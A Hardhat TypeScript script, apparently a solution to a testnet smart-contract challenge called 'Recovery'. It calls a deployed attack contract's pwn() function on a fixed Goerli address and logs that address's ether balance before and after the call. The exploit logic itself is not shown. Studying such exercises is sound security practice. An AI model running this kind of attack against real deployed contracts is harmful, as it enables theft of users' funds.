import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x752788d10B9627bA62AE50376cF2107217852f02"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "string",
          name: "_name",
          type: "string",
        },
        {
          internalType: "uint256",
          name: "_initialSupply",
          type: "uint256",
        },
      ],
      name: "generateToken",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x3894e516",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Recovery")

  const tx = await contract.pwn(targetAddress, { gasLimit: 100000 })

  console.log((await provider.getBalance(targetAddress)).toString())

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log((await provider.getBalance(targetAddress)).toString())
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
